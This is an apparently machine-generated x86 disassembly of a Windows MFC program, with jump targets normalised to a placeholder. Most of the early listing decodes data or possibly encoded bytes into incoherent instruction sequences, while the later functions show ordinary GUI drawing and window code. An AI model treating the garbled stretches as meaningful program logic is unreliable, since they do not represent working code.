sub_401493
cwde
sbb ebp esi
mov al 0x1b
cmpsb [ esi ] [ edi ]
adc edi ebp
pushfd
mov [ 0xffffffffe590a290 ] eax
jg rwxdata
in al 0x9f
add eax 0x6f6f6baf
push ebx
lds ebx [ ebx ]
jl rwxdata
inc edx
jb rwxdata
nop
nop
nop
nop
arpl [ edx ] di
mov [ 0xffffffffd02d1d50 ] eax
pushad
outsd
outsd
sub esp edx
nop
nop
nop
arpl [ edx ] di
push edi
adc eax 0x6f6f613d
push esp
mov al [ 0xfffffffff06f6f60 ]
mov [ 0x142d1d50 ] eax
pushad
outsd
outsd
sub esp esp
lahf
ja rwxdata
outsd
outsd
arpl [ ebx + 0x73 ] bp
inc esp
outsd
arpl [ eax ] ax
add [ ebx + 0x44 ] al
dec edx
inc esi
dec edx
push edi
dec ebx
push ebx
dec ebx
dec edx
inc esp
inc esi
inc ebp
push edi
inc ecx
add ah dh
sbb esp [ ebp - 0x6f6f6f60 ]
sbb esp esi
pushfd
sbb esp esi
mov [ ebx ] ds
jns rwxdata
popfd
nop
nop
lds ebx [ ebx ]
jl rwxdata
cli
nop
outsd
push es
adc eax 0x19909090
push ss
push ebp
cwde
nop
nop
outsd
push es
sbb [ eax + 0x27ad9090 ] edx
nop
nop
nop
in eax 0x94
pop ecx
push edx
xchg esp eax
nop
push esp
mov al [ 0x1b6f6f6a ]
in eax 0x98
sbb eax 0x90936b16
nop
sar dl 0x90
sub_401515
sbb eax 0x9099fb16
nop
rcr [ 0xffffffff9091d516 ] 0x90
shr [ edi + 0x6 ] 0x6d
nop
nop
nop
js rwxdata
mov [ 0xffffffffd02d1d50 ] eax
pushad
outsd
outsd
sub esp edx
nop
nop
nop
arpl [ edx ] di
push edi
adc eax 0x6f6f613d
nop
nop
nop
out 0xe3 eax
mov [ 0xffffffff90a2a3cf ] al
enter 0x6fc0 0x6
or eax 0x19909090
push ss
inc edx
jb rwxdata
nop
nop
push ebx
0xaa789090 0x9090
nop
jno rwxdata
nop
nop
nop
sbb [ esi ] edx
and al 0x1e
xchg ecx eax
nop
inc ecx
sar [ ecx - 0x716f7a14 ] 0x1
sub edi [ ebp + esi * 8 - 0x77 ]
nop
pushfd
enter 0x7a7d 0x8d
nop
adc [ ebp - 0x6f6a3012 ] edi
sub dh [ edx - 0x6f625820 ]
sbb bh [ eax - 0x54 ]
0x5d559081 0x8c56
ja rwxdata
outsd
outsd
arpl [ ebx + 0x73 ] bp
inc esp
outsd
arpl [ eax ] ax
add [ ebx + 0x44 ] al
dec edx
inc esi
dec edx
push edi
dec ebx
push ebx
dec ebx
dec edx
inc esp
inc esi
inc ebp
push edi
inc ecx
add ah dh
sbb esp [ ebp - 0x6f6f6f60 ]
sbb esp esi
pushfd
sbb esp esi
mov [ ebx ] ds
jns rwxdata
popfd
nop
nop
lds ebx [ ebx ]
jl rwxdata
cli
nop
outsd
push es
adc eax 0x19909090
push ss
push ebp
cwde
nop
nop
outsd
push es
sbb [ eax + 0x27ad9090 ] edx
nop
nop
nop
in eax 0x94
pop ecx
push edx
xchg esp eax
nop
push esp
mov al [ 0x1b6f6f6a ]
in eax 0x98
sbb eax 0x90936b16
nop
sar dl 0x90
sub_40170a
xchg ecx eax
sbb ebp edx
insb
not [ edi + 0x15 ]
enter 0x6f6e 0x6f
xchg edx eax
nop
sbb eax 0x6f6dd515
outsd
shr [ edi - 0x3a ] 0x89
adc ebp [ eax + 0x6f ]
in eax 0x8a
sbb eax 0x6f6dd515
outsd
shr [ edi - 0x3a ] 0x8d
fwait
push eax
in eax 0x95
jns rwxdata
sbb ebx [ 0x6f6f6dd0 ]
stosd [ edi ]
push ds
push ecx
xchg edx eax
nop
nop
out 0x9c al
push edi
adc eax 0x6f6f6dd0
nop
nop
nop
nop
mov [ 0xffffffffd12d1d59 ] eax
insb
outsd
outsd
mov ecx 0x92552e1d
nop
nop
xchg edx eax
nop
nop
sbb edx eax
pushfd
sbb edx [ eax + 0x1519901b ]
int3
sub_4017bb
outsd
push es
jns rwxdata
mov ch 0x91
nop
nop
cli
sbb [ 0x6f6ec815 ] 0x6f
shr [ edi - 0x1b ] 0x6c
nop
nop
adc [ esi ] ch
jg rwxdata
outsd
nop
nop
xchg ecx eax
lahf
adc eax 0x9090901f
shr [ edi - 0x3a ] 0x85
sbb eax 0x6f6ca92d
outsd
push esi
xchg edi eax
xchg esp eax
push esi
xlat
xchg ecx eax
xchg ecx eax
neg [ ecx ]
xlat
xchg edx eax
sbb eax 0x6f6cd115
outsd
shr [ edi - 0x3a ] 0x89
adc ebp [ eax + 0x6f ]
in eax 0x85
sbb eax 0x6f6cd115
outsd
shr [ edi - 0x3a ] 0x8d
adc eax 0x1b1be450
rcr [ ebx + ebx + 0x19901b90 ] 0x1
xlat
xchg esp eax
push esi
xlat
cwde
nop
cli
cdq
sub_40182e
outsd
push es
jne rwxdata
rwxdata
nop
nop
adc eax 0x59149f50
xchg ecx eax
nop
nop
adc bh ch
xchg ecx eax
0x149f
outsd
nop
nop
xchg ecx eax
lahf
adc eax 0x9090901f
shr [ edi - 0x3a ] 0x85
sbb eax 0x6f6ca92d
outsd
push esi
xchg edi eax
xchg esp eax
push esi
xlat
xchg ecx eax
xchg ecx eax
neg [ ecx ]
xlat
xchg edx eax
sbb eax 0x6f6cd115
outsd
shr [ edi - 0x3a ] 0x89
adc ebp [ eax + 0x6f ]
in eax 0x85
sbb eax 0x6f6cd115
outsd
shr [ edi - 0x3a ] 0x8d
adc eax 0x1b1be450
rcr [ ebx + ebx + 0x19901b90 ] 0x1
xlat
xchg esp eax
push esi
xlat
cwde
nop
cli
cdq
sub_4018ca
outsd
push es
jne rwxdata
mov edx [ eax - 0x202c6f70 ]
nop
nop
adc edi ebp
insd
popfd
0x92e59a9d 0x957b
adc edx [ edi - 0x6f ]
jpo rwxdata
movsb [ edi ] [ esi ]
push 0x6f
outsd
shr [ edi - 0x1b ] 0x6c
cli
nop
iretd
sub_4019d0
sbb ebx ebp
push 0xfb161dc6
cdq
nop
nop
rol bh 0xc7
outsd
push es
xchg ebp eax
xchg ecx eax
nop
nop
adc edx [ edi - 0x80 ]
adc edi [ ecx - 0x80 ]
in eax 0x78
iretd
sub_401a86
sbb esp ebp
cwde
push edi
adc eax 0x6f6f6e64
xchg ecx eax
nop
nop
nop
outsd
in eax 0x80
pop ds
adc eax 0x6f6f6e68
push edi
adc eax 0x6f6f6e7c
and al 0x90
nop
nop
push edi
adc eax 0x6f6f6e60
nop
nop
nop
nop
mov [ 0x68d51950 ] eax
sbb ebp edx
insb
adc ebp ebp
pushfd
nop
in eax 0x8f
sbb eax 0x6f6e7c15
outsd
sar dl 0x90
cli
nop
sbb eax 0x6f6e6415
outsd
sar dl 0x90
outsd
push es
or [ eax + 0x68139090 ] edx
nop
out 0x8e al
cli
nop
outsd
in eax 0x88
outsd
in eax 0x84
outsd
in eax 0x80
adc ebp ebp
pushfd
nop
in eax 0x95
outsd
mov [ ecx - 0x39906c85 ] 0x9d
adc ebp [ eax - 0x6f ]
in eax dx
xchg edi eax
int1
mov [ 0xffffffff84525950 ] eax
nop
xchg ecx eax
aad 0x84
xchg ecx eax
aad 0x68
mov ecx 0xed1388d5
mov [ eax + 0x1bf137e5 ] dl
aad 0x68
pop ecx
push edx
test [ eax + 0x137c1bc5 ] dl
push esp
jl rwxdata
retn
sub_401b21
mov edx 0x80d51bc1
mov [ 0xffffffffac2e0242 ] eax
nop
nop
nop
xchg ebx eax
in eax 0x9c
sbb edx [ esi + 0x1b9cd593 ]
loopne rwxdata
retn 0x1bc1
adc edx [ esi - 0x78 ]
xchg ebx eax
in eax 0x9c
sbb edx [ esi + 0x137cd519 ]
push esi
xchg esp eax
sbb eax 0x933d68ed
aad 0x9c
cmp ebx [ ecx ]
aad 0x68
cmp eax 0xc09cd593
cmp ebx [ ecx ]
aad 0x64
sbb edx [ esi + 0x199cd593 ]
aad 0x60
into
push edi
aad 0x6c
nop
nop
nop
nop
sbb edx ebp
insb
test eax 0x9be57cd5
mov [ 0xffffffffcfcac950 ] eax

sub_401b80
sbb edx [ esi + 0x79cd593 ]
sbb ecx [ edi - 0x39 ]
mov [ 0x6de53e50 ] al
into
mov ebx 0xa36cc26b
pop ecx
fstp [ ebx ]
inc ecx
mov [ 0x3c4ba350 ] eax
mov [ 0x1a5d1a51 ] al
jpe rwxdata
mov [ 0x45e5df43 ] eax
inc esi
cwde
test [ ecx + 0x7b ] 0xf6
inc ecx
dec eax
jecxz rwxdata
sbb eax 0x933d68ed
aad 0x9c
cmp ebx [ ecx ]
aad 0x68
cmp eax 0xc09cd593
cmp ebx [ ecx ]
aad 0x64
sbb edx [ esi + 0x199cd593 ]
aad 0x60
into
push edi
aad 0x6c
nop
nop
nop
nop
sbb edx ebp
insb
test eax 0x9be57cd5
mov [ 0xffffffffcfcac950 ] eax

mul [ ebp + 0x11f613b0 ]
arpl [ eax ] bp
jge rwxdata
xchg edi eax
sbb edi ecx
xchg esp eax
sbb edx edi
js rwxdata
inc edx
inc ecx
sbb edx [ edx + 0x51 ]
push eax
xor dh 0x1b
push ecx
0x40ab
pop esi
in eax 0x7b
mov [ 0xffffffffdf43a358 ] eax
in eax 0x45
add [ ebx ] bl
0x3adcc878 0x22e3
iretd
sub_401bd2
in al 0x9a
into
adc edx [ esi - 0x6c ]
adc edx ebp
insb
xchg ecx eax
jpo rwxdata
iretd
into
sbb edx ebp
insb
inc ecx
jo rwxdata
iretd
aad 0x60
mov [ 0x1bf60666 ] eax
xchg esi eax
not [ ecx + 0x70 ]
xchg edx eax
xchg ebx eax
aad 0x68
push es
sbb edx [ esi - 0x36632a6d ]
0xcbcf
sub_401c32
xlat
push 0x196ccfa3
xlat
cwde
sbb edi ecx
pushfd
sbb esp [ edi + 0x78 ]
mov al [ 0x30909090 ]
push cs
imul bh
stosd [ edi ]
pop esp
add [ ebx ] bl
0x3adcc878 0x22e3
sub_4021f0
sbb ecx [ esi ]
inc ecx
cwde
nop
nop
sbb ebx [ esi ]
inc ebp
cwde
nop
nop
sbb eax [ ebx ]
dec ecx
cwde
nop
nop
sbb edx [ ebx ]
dec ebp
cwde
nop
nop
push ecx
push edx
adc [ ecx + 0x50 ] 0xffffff8b
xchg ebx eax
add al 0xa1
dec ecx
cwde
nop
nop
xchg ebx eax
adc al 0xa1
dec ebp
cwde
nop
nop
sbb [ ebx ] edx
dec ecx
cwde
nop
nop
sbb [ ebx ] eax
dec ebp
cwde
nop
nop
adc edi [ ebx - 0x68 ]
jecxz rwxdata
cwde
nop
nop
adc edi [ ebx - 0x68 ]
jecxz rwxdata
sub edx [ eax ]
nop
nop
nop
adc edi [ ecx - 0x68 ]
jecxz rwxdata
sub edx [ eax ]
nop
nop
nop
adc edi [ ecx - 0x68 ]
jecxz rwxdata
sub [ eax ] edx
nop
nop
nop
sbb [ esi ] ecx
inc ecx
cwde
nop
nop
sbb [ esi ] ebx
inc ebp
cwde
nop
nop

mov al [ 0xffffffffb09090a0 ]
mov al 0x90
nop
add [ eax - 0x6f6f5f60 ] 0xb0
mov al 0x80
xor [ eax - 0x5f6f6f50 ] 0xa0
lds ebx [ ebx ]
jl rwxdata
sub [ eax ] edx
nop
nop
nop
sbb [ esi ] ecx
inc ecx
cwde
nop
nop
sbb [ esi ] ebx
inc ebp
cwde
nop
nop
leave
into
pop ecx
push edx
xchg esp eax
nop
retn
rcr [ ebx ] 0xe5
cwde
sbb ecx [ esi ]
inc ecx
cwde
nop
nop
sbb ebx [ esi ]
inc ebp
cwde
nop
nop
sbb eax [ ebx ]
dec ecx
cwde
nop
nop
sbb edx [ ebx ]
dec ebp
cwde
nop
nop
push ecx
push edx
adc [ ecx + 0x50 ] 0xffffff8b
xchg ebx eax
add al 0xa1
dec ecx
cwde
nop
nop
xchg ebx eax
adc al 0xa1
dec ebp
cwde
nop
nop
sbb [ ebx ] edx
dec ecx
cwde
nop
nop
sbb [ ebx ] eax
dec ebp
sub_4022a4
xor [ eax + 0x1b909090 ] esp
aam 0xb4
mov [ ebx ] ss
js rwxdata
dec ecx
cwde
nop
nop
adc edx [ ecx - 0x6f ]
outsd
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
cmp eax 0x6fd1a441
outsd
outsd
js rwxdata
dec ecx
js rwxdata
nop
nop
nop
sbb edx esp
mov ah 0x8c
adc edi [ eax - 0x4b ]
push 0x15196f6f
mov cl 0x61
outsd
outsd
js rwxdata
push edi
push ss
inc ebp
cwde
nop
nop
rcl [ eax - 0x32876f70 ] 0x6f
outsd
outsd
nop
nop
nop
and eax 0x6f6f6baf
cli
nop
js rwxdata
int1
cdq
nop
nop
push edi
push ss
inc ecx
cwde
nop
nop
nop
nop
nop
nop
adc ebp [ ecx - 0x4e ]
loop rwxdata
nop
nop
nop
int1
hlt
sub_402338
cli
nop
outsd
inc eax
sbb ebp edx
insb
js rwxdata
nop
outsd
add eax 0x6f6f61b1
sbb [ 0x6f6f6bd3 ] edx
xchg ecx eax
nop
nop
ja rwxdata
inc ebx
mov [ 0xffffffff90059a2b ] eax
xchg edi eax
cmpsb [ esi ] [ edi ]
arpl [ ecx - 0x6f4665d5 ] cx
cmp al 0x1b
dec esi
push edi
sub ebx [ edx - 0xb16fef ]
mov ch 0x4e
sub ebx [ edx - 0x32de6f3f ]
inc eax

outsd
outsd
clc
outsd
nop
nop
nop
sbb eax 0x6f66a60d
outsd
retn
clc
add ah [ ebx + 0x4c ]
xchg esp eax
outsd
and eax 0x6f6f6baf
cli
nop
js rwxdata
outsd
sub [ eax - 0x6fea65d5 ] esi
or eax 0x2bf8f2da
0xa62a9031 0x9a51
sub ebx [ edx + 0x6cb29035 ]
sbb [ edx + 0x2b ] ecx
0x2a459021 0x9e0b
sub ebx [ edx + 0x58ac9025 ]
xor eax 0x299a2bfb
nop
mov edx [ eax + ecx - 0x1c ]
sub ebx [ edx + 0x3378902d ]
hlt
sub_4023c8
sub ebx [ edx - 0x42b06f3b ]
sbb [ ebx + ebp ] ebx
0xe70390c9 0xb1e7
sub ebx [ edx + 0xdd290f9 ]
adc eax 0xe19a2b15
nop
mov eax [ 0x2fc9dbbb ]
0xb3af90cd 0xe7c5
das
0x37c690f1 0x3b89
das
0x7a090f5 0xc23
das
0x615e90fd 0xf34d
das
0xebe890e9 0x79e7
sub ebx [ edx - 0x4a4c6f13 ]
cld
stc
das
0x923f90e5 0x1488
inc ebx
0xc60990a1 0x5d89
inc ebx
0x5ab890a5 0x6adc
inc ebx
0xb10890d1 0xbc12
inc ebx
0x2c7890d5 0x6b42
inc ebx
0x6a4490d9 0xa40e
inc ebx
0x99ab90dd 0x1827
inc ebx
0x595690a9 0xcb0e
inc ebx
0x786e90ad 0xd4a4
sub ebx [ edx - 0x51126fe3 ]
mov edx 0x19a2bdb
nop
sahf
sbb [ edx - 0x4e65d42c ] edx
nop
add [ edx - 0x65d445c3 ] 0x9b9590b5
out dx al
mov dh 0x2b
0x3d1c90bd 0x4bcd
sub ebx [ edx + 0x118b9a60 ]
in eax dx
jg rwxdata
lahf
daa
0xf1ca9c68 0xc448
sub ebx [ edx - 0x6f6f6394 ]
nop
nop
iretd
sub_402529
outsd
add eax 0x6f6f61bd
adc [ 0x6f6f64ea ] ch
cli
nop
sbb eax 0x6f640315
outsd
rol bl 0x6f
add eax 0x6f6f6021
jns rwxdata
outsd
outsd
outsd
inc eax
shr [ edi + 0x5 ] 0xe4
imul ebp [ edi + 0x6f ] 0x13
js rwxdata
cli
nop
js rwxdata
outsd
outsd
xchg ecx eax
nop
nop
js rwxdata
push esi
xchg edx eax
sbb ebp esp
push 0x90ae13f6
in al 0x81
lahf
daa
xchg esi eax
lahf
daa
ficom [ edx + 0x19945613 ]
movsb [ edi ] [ esi ]
test al 0x93
popad
jpo rwxdata
sbb ebx ebp
insb
stosd [ edi ]
pop eax
in eax 0xbd
sbb eax 0x6f60a015
outsd
rcr [ 0x6f60d015 ] 0x6f
sar dl 0x90
cli
nop
cli
nop
cli
nop
cli
nop
xchg ecx eax
in eax 0xf3
cli
xchg ecx eax
sbb eax 0x6f601415
outsd
rcr [ ebx ] 0xe5
push 0x6f945613
inc esi
clc
xchg ebx eax
das
mov cl 0xa9
outsd
and eax 0x6f6f6baf
nop
nop
nop
int1
hlt
retn
clc
outsd
nop
nop
nop
sbb eax 0x6f66a615
outsd
rcr [ 0x6f67a52d ] 0x6f
sub_402d1a
sbb esp ebp
cwde
cli
nop
cli
xchg edx eax
outsd
push es
sub [ eax + 0x15199090 ] edx
inc esp
outsb
outsd
outsd
push edi
adc eax 0x6f6f6e48
mov eax 0x1d909091
sbb eax 0x6f6f6e48
shr [ edi + 0x25 ] 0x44
outsb
outsd
outsd
outsd
push es
sub eax 0x7b909090
xlat
outsd
in eax 0x9c
sbb eax 0x6f6e6c1d
outsd
shr [ edi + 0x6 ] 0x5d
nop
nop
nop
fwait
push eax
in eax 0xb0
outsd
fld [ eax - 0x6f7f12ed ]
out 0x87 eax
outsd
and eax 0x6f6f6e44
outsd
push es
xor [ eax + 0x151b9090 ] edx
jo rwxdata
sbb eax 0x6f7fa015
outsd
sar dl 0x91
cli
nop
sbb eax 0x90948817
nop
sar al 0x92
nop
nop
adc [ edi - 0x39 ] ch
movsd [ edi ] [ esi ]
push edi
adc eax 0x6f6f7fbc
xchg esp eax
xchg ecx eax
nop
nop
sbb eax 0x6f7fbc15
outsd
rcr [ 0x6f7f1815 ] 0x6f
sar dl 0x90
cli
nop
cli
nop
outsd
and eax 0x6f6f7fa0
outsd
outsd
outsd
into
pop ecx
push edx
pushfd
nop
sbb eax 0x6f6e481d
outsd
shr [ edi + 0x25 ] 0x44
outsb
outsd
outsd
outsd
push es
push ecx
nop
nop
nop
adc ebp [ eax - 0x6f ]
in al 0x24
outsd
and eax 0x6f6f6e44
outsd
push es
xor [ eax + 0x50a39090 ] edx
into
pop ecx
push edx
pushfd
nop
popad
nop
rcl [ edx + 0x117c1bc5 ] cl
push esp
mov al 0x7f
outsd
outsd
mov bl 0xc7
retn 0x57c1
sub_402fa1
outsd
push es
inc ecx
nop
nop
nop
sbb eax 0x6f7fb01d
outsd
sar edx 0x90
shr [ edi + 0x27 ] 0x49
nop
nop
nop
cli
jno rwxdata
outsd
outsd
push es
xor [ eax + 0x64f89090 ] edx
xchg ecx eax
nop
nop
outsd
push es
xor eax 0xc8909090
adc ebp [ eax - 0x70 ]
lahf
adc al 0xfa
outsb
outsd
nop
nop
outsd
push es
dec ebp
nop
nop
nop
sbb ebp edx
insb
clc
inc esp
mov [ esi ] ah
adc ch [ edi + 0x26 ]
sub ebx [ edx + 0x266f9090 ]
jno rwxdata
outsd
leave
0xcbcf
nop
nop
outsd
push es
dec ebp
nop
nop
nop
cli
nop
outsd
inc eax
sbb ebp edx
push 0x760228f8
jl rwxdata
jge rwxdata
das
0x266f9090 0x9071
nop
nop
outsd
push es
das
ficom [ edx + 0x117c1bc5 ]
push esp
xchg esp eax
push 0x6f
outsd
mov esi 0x8260d02e
nop
adc ebp ebp
cwde
nop
jecxz rwxdata
xchg ecx eax
adc [ edi + 0x5668e590 ] ch
xlat
insd
nop
sbb edx [ esi ]
jge rwxdata
nop
nop
cli
popfd
outsd
lds esp [ ecx + ebx - 0x2b ]
pushad
cli
nop
cli
nop
cli
nop
sbb eax 0x6fc044d5
lds ebp [ ebx + edx - 0x13 ]
dec eax
and ch 0xb9
clc
mov bl 0x71
pop ss
outsd
das
0x266f9090 0x9071
nop
nop
outsd
push es
dec ebp
nop
nop
nop
outsd
in eax 0x60
outsd
inc eax
outsd
in eax 0x40
outsd
push es
xor [ eax + 0x52599090 ] edx
xchg esp eax
nop
adc ebp ebp
dec eax
fsetpm287_nop
cmp edi [ ebx + 0x2c ]
pop ecx
push edx
xchg esp eax
nop
dec ebp
nop
nop
nop
sbb ebp edx
cli
nop
outsd
in eax 0x68
outsd
jge rwxdata
outsd
in eax 0x80
outsd
in eax 0x9c
outsd
in eax 0x98
cli
nop
outsd
nop
cli
nop
outsd
and eax 0x6f6f7fb8
outsd
push es
pop ecx
nop
nop
nop
shr [ edi + 0x25 ] 0xb8
jg rwxdata
nop
nop
adc edx [ eax - 0x64 ]
sbb [ eax - 0x5df17908 ] esp
xor ebp [ edi + 0x26 ]
das
0x266f9090 0x9071
sub_403383
outsd
inc eax
jpo rwxdata
nop
outsd
push es
dec ebp
nop
nop
nop
clc
outsd
nop
nop
nop
sbb eax 0xfac068d5
xchg ecx eax
cli
nop
js rwxdata
mov ah 0x6e
jpo rwxdata
nop
nop
nop
retn
push 0xc792fac0
outsd
in eax 0x6c
outsd
clc
pop esi
ja rwxdata
xor [ eax - 0x1a906f70 ] edx
sub [ edi - 0x1b ] 0x9c
outsd
in eax 0x98
cli
nop
outsd
leave
outsd
sub ebx [ es : edx + 0x266f9090 ]
jno rwxdata
stc
outsd
in eax 0x60
pop ds
push ss
pop ecx
cwde
nop
nop
outsd
in eax 0x6c
outsd
push es
nop
sub_403f00
sub esp 0x10
push ebx
mov ebx [ esp + 0x2c ]
push ebp
push esi
push edi
mov edi [ esp + 0x30 ]
imul edi ebx
mov edx ebx
mov [ esp + 0x18 ] ecx
neg edx
mov [ esp + 0x1c ] edx
mov edx [ esp + 0x2c ]
mov [ esp + 0x10 ] 0x0
lea eax [ ecx + 0x4 ]
add edi edx
mov [ esp + 0x14 ] 0x4
jmp rwxdata
mov esi [ esp + 0x34 ]
mov edx [ esp + 0x10 ]
imul esi ebx
lea ecx [ ecx + edx * 8 + 0x2c ]
mov ebp ebx
mov edx eax
mov eax [ esp + 0x28 ]
neg ebp
mov [ esp + 0x38 ] ecx
mov [ esp + 0x30 ] edx
add esi eax
mov [ esp + 0x2c ] 0x4
mov eax [ esp + 0x2c ]
add edx 0x2
add esi ebp
dec eax
mov [ esp + 0x30 ] edx
mov [ esp + 0x2c ] eax
jne rwxdata
mov eax [ esp + 0x24 ]
test eax eax
je rwxdata
cmp [ edx ] 0x1
jne rwxdata
mov ecx [ esp + 0x14 ]
mov eax edx
mov edx [ esp + 0x1c ]
add edi edx
dec ecx
mov [ esp + 0x14 ] ecx
jne rwxdata
mov eax [ esp + 0x10 ]
mov [ ecx - 0x4 ] esi
mov [ ecx ] edi
inc eax
add ecx 0x8
mov [ esp + 0x10 ] eax
mov [ esp + 0x38 ] ecx
mov eax [ eax + 0x4 ]
lea edx [ edi + ebx ]
lea ecx [ esi + ebx ]
push edx
push ecx
push edi
push esi
push eax
call [ Rectangle@IAT ]
mov ecx [ esp + 0x38 ]
mov edx [ esp + 0x30 ]
mov ecx [ esp + 0x18 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn 0x20
sub_403fe0
push esi
mov esi ecx
call sub_404370
movsx eax [ esp + 0x14 ]
mov ecx 0x3
cmp eax ecx
ja rwxdata
pop esi
retn 0x10
jmp [ eax * 4 + jump_table_404088 ]
mov eax 0x1
mov [ esi + 0x48 ] ecx
mov [ esi + 0xe ] ax
mov [ esi + 0x16 ] ax
mov [ esi + 0x1e ] ax
mov [ esi + 0x20 ] ax
mov [ esi + 0x4c ] 0x2
pop esi
retn 0x10
mov eax 0x1
mov [ esi + 0x48 ] ecx
mov [ esi + 0x1a ] ax
mov [ esi + 0x22 ] ax
mov [ esi + 0x1e ] ax
mov [ esi + 0x20 ] ax
mov [ esi + 0x4c ] ecx
pop esi
retn 0x10
mov eax 0x1
mov [ esi + 0x48 ] 0x2
mov [ esi + 0xe ] ax
mov [ esi + 0x10 ] ax
mov [ esi + 0x18 ] ax
mov [ esi + 0x20 ] ax
mov [ esi + 0x4c ] ecx
pop esi
retn 0x10
mov eax 0x1
mov [ esi + 0x48 ] ecx
mov [ esi + 0x1a ] ax
mov [ esi + 0x16 ] ax
mov [ esi + 0x1e ] ax
mov [ esi + 0x18 ] ax
mov [ esi + 0x4c ] ecx
sub_4040a0
push esi
mov esi ecx
call sub_404370
movsx eax [ esp + 0x14 ]
mov ecx 0x3
cmp eax ecx
ja rwxdata
pop esi
retn 0x10
jmp [ eax * 4 + jump_table_40414c ]
mov eax 0x1
mov [ esi + 0x48 ] ecx
mov [ esi + 0x10 ] ax
mov [ esi + 0x18 ] ax
mov [ esi + 0x20 ] ax
mov [ esi + 0x1e ] ax
mov [ esi + 0x4c ] 0x2
pop esi
retn 0x10
mov eax 0x1
mov [ esi + 0x48 ] ecx
mov [ esi + 0x14 ] ax
mov [ esi + 0x16 ] ax
mov [ esi + 0x20 ] ax
mov [ esi + 0x18 ] ax
mov [ esi + 0x4c ] 0x2
pop esi
retn 0x10
mov eax 0x1
mov [ esi + 0x48 ] ecx
mov [ esi + 0xe ] ax
mov [ esi + 0x16 ] ax
mov [ esi + 0x1e ] ax
mov [ esi + 0x10 ] ax
mov [ esi + 0x4c ] 0x2
pop esi
retn 0x10
mov eax 0x1
mov [ esi + 0x48 ] ecx
mov [ esi + 0x16 ] ax
mov [ esi + 0x1e ] ax
mov [ esi + 0x20 ] ax
mov [ esi + 0x22 ] ax
mov [ esi + 0x4c ] ecx
sub_404190
push esi
mov esi ecx
call sub_404370
movsx eax [ esp + 0x14 ]
sub eax 0x0
je rwxdata
mov eax 0x1
mov [ esi + 0x1a ] ax
mov [ esi + 0x18 ] ax
mov [ esi + 0x1e ] ax
mov [ esi + 0x20 ] ax
mov eax 0x3
mov [ esi + 0x48 ] eax
mov [ esi + 0x4c ] eax
dec eax
jne rwxdata
pop esi
retn 0x10
mov eax 0x1
mov [ esi + 0x48 ] 0x3
mov [ esi + 0xe ] ax
mov [ esi + 0x16 ] ax
mov [ esi + 0x18 ] ax
mov [ esi + 0x20 ] ax
mov [ esi + 0x4c ] 0x2
pop esi
retn 0x10
sub_4041f0
push esi
mov esi ecx
call sub_404370
movsx eax [ esp + 0x14 ]
sub eax 0x0
je rwxdata
mov eax 0x1
mov [ esi + 0x16 ] ax
mov [ esi + 0x18 ] ax
mov [ esi + 0x22 ] ax
mov [ esi + 0x20 ] ax
mov eax 0x3
mov [ esi + 0x48 ] eax
mov [ esi + 0x4c ] eax
dec eax
jne rwxdata
pop esi
retn 0x10
mov eax 0x1
mov [ esi + 0x48 ] 0x3
mov [ esi + 0x10 ] ax
mov [ esi + 0x16 ] ax
mov [ esi + 0x18 ] ax
mov [ esi + 0x1e ] ax
mov [ esi + 0x4c ] 0x2
pop esi
retn 0x10
sub_404250
push esi
mov esi ecx
call sub_404370
movsx eax [ esp + 0x14 ]
sub eax 0x0
je rwxdata
mov eax 0x1
mov [ esi + 0x48 ] 0x3
mov [ esi + 0xe ] ax
mov [ esi + 0x16 ] ax
mov [ esi + 0x1e ] ax
mov [ esi + 0x6 ] ax
mov [ esi + 0x4c ] eax
dec eax
jne rwxdata
pop esi
retn 0x10
mov eax 0x1
mov [ esi + 0x48 ] 0x2
mov [ esi + 0x18 ] ax
mov [ esi + 0x16 ] ax
mov [ esi + 0x1a ] ax
mov [ esi + 0x14 ] ax
mov [ esi + 0x4c ] 0x3
pop esi
retn 0x10
sub_4042b0
push esi
mov esi ecx
call sub_404370
movsx eax [ esp + 0x14 ]
mov ecx 0x3
cmp eax ecx
ja rwxdata
pop esi
retn 0x10
jmp [ eax * 4 + jump_table_404354 ]
mov eax 0x1
mov [ esi + 0x48 ] ecx
mov [ esi + 0x18 ] ax
mov [ esi + 0x22 ] ax
mov [ esi + 0x1e ] ax
mov [ esi + 0x20 ] ax
mov [ esi + 0x4c ] ecx
pop esi
retn 0x10
mov eax 0x1
mov [ esi + 0x48 ] ecx
mov [ esi + 0x16 ] ax
mov [ esi + 0x20 ] ax
mov [ esi + 0x18 ] ax
mov [ esi + 0x10 ] ax
mov [ esi + 0x4c ] 0x2
pop esi
retn 0x10
mov eax 0x1
mov [ esi + 0x48 ] ecx
mov [ esi + 0x1a ] ax
mov [ esi + 0x16 ] ax
mov [ esi + 0x18 ] ax
mov [ esi + 0x20 ] ax
mov [ esi + 0x4c ] ecx
pop esi
retn 0x10
mov eax 0x1
mov [ esi + 0x48 ] ecx
mov [ esi + 0x10 ] ax
mov [ esi + 0x18 ] ax
mov [ esi + 0x20 ] ax
mov [ esi + 0x1a ] ax
mov [ esi + 0x4c ] ecx
sub_404430
push 0xffffffff
push sub_406398
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x12c
push esi
mov esi ecx
push 0x0
call Ordinal_MFC42_1134
add esp 0x4
mov ecx esi
call Ordinal_MFC42_2621
push rwxdata
mov ecx esi
call Ordinal_MFC42_6117
push 0x4
mov ecx esi
call Ordinal_MFC42_4159
push 0x6c
call Ordinal_MFC42_823
add esp 0x4
mov [ esp + 0x4 ] eax
test eax eax
mov [ esp + 0x138 ] 0x0
je rwxdata
xor eax eax
push rwxdata
push rwxdata
push rwxdata
push 0x80
mov ecx eax
call Ordinal_MFC42_520
jmp rwxdata
mov ecx [ esi + 0x20 ]
push 0x0
call Ordinal_MFC42_6215
mov esi [ esi + 0x20 ]
mov edx [ esi + 0x20 ]
push edx
call [ UpdateWindow@IAT ]
push 0x408
push rwxdata
lea eax [ esp + 0x34 ]
push rwxdata
push eax
call [ sprintf@IAT ]
add esp 0x10
lea ecx [ esp + 0x8 ]
mov [ esp + 0x138 ] 0xffffffff
call Ordinal_MFC42_617
mov ecx [ esp + 0x130 ]
mov eax 0x1
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x138
retn
lea ecx [ esp + 0x8 ]
mov [ esp + 0x138 ] 0xffffffff
call Ordinal_MFC42_617
xor eax eax
pop esi
mov ecx [ esp + 0x12c ]
mov [ fs : 0x0 ] ecx
add esp 0x138
retn
push eax
mov ecx esi
mov [ esp + 0x13c ] 0xffffffff
call Ordinal_MFC42_986
lea ecx [ esp + 0x8 ]
